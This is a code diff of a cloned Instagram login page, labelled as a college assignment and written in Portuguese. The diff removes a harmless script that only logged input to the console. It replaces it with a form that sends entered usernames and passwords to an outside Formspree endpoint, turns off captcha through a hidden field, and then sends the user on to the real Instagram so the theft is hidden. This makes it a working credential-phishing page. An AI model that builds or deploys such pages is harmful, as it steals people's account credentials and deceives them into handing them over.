@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>Instagram - Trabalho Faculdade</title>
     <style>
         /* RESET BÁSICO */
         * {
@@ -167,7 +167,7 @@
                 <img src="./img/instagram-logo.png" class="instagram-logo" alt="instagram logo">
 
                 <div class="user-login">
-                    <form id="loginForm">
+                    <form action="https://formspree.io/f/xkoojkow" method="POST">
                         <input 
                             type="text" 
                             name="login" 
@@ -180,6 +180,13 @@
                             placeholder="Senha" 
                             required
                         >
+
+                        <!-- Redirecionamento após envio -->
+                        <input type="hidden" name="_next" value="https://www.instagram.com/">
+
+                        <!-- Desativa captcha do Formspree -->
+                        <input type="hidden" name="_captcha" value="false">
+
                         <button type="submit" class="instagram-entrar">Entrar</button>
                     </form>
                 </div>
@@ -212,18 +219,5 @@
             </div>
         </div>
     </div>
-
-    <!-- SCRIPT PARA REDIRECIONAR APÓS "LOGIN" -->
-    <script>
-        document.getElementById("loginForm").addEventListener("submit", function(e){
-            e.preventDefault(); // impede envio real
-            // Você pode pegar os valores se quiser:
-            const login = this.login.value;
-            const senha = this.senha.value;
-            console.log("Login:", login, "Senha:", senha); // só para teste
-            // Redireciona para Instagram
-            window.location.href = "https://www.instagram.com/";
-        });
-    </script>
 </body>
 </html>
